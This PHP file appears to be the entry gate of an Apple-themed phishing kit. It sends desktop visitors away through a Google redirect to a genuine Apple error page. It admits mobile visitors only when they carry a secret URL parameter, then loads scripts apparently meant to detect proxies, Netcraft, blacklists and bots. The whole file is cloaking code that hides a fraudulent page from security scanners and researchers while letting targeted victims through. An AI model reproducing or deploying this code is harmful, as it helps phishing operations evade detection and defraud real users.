<?php
$detect_ua = strtolower( $_SERVER['HTTP_USER_AGENT'] );
if(!preg_match("/os x|macintosh|mac|ipod|ipad|iphone|MacOS|macos|android/", $detect_ua)){
header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwjSrYTG2bXVAhULPY8KHb5RD5YQFgg2MAE&url=https%3A%2F%2Fwww.apple.com%2Ferrors%2Fus_error.html&usg=AFQjCNGtcqdZoVziBzc3g0zk7DLucUwzkw");
exit();
}else{
if (isset($_GET['unlocked_yourid1'])) {
    require "assets/includes/proxy_check.php";
    require "assets/includes/visitor_log.php";
    require "assets/includes/netcraft_check.php";
    require "assets/includes/blacklist_lookup.php";
    require "assets/includes/ip_range_check.php";
    require "assets/includes/antibotlogin.php";
 } else {
       header("Location: https://page404notfound.com");
  }

}
?>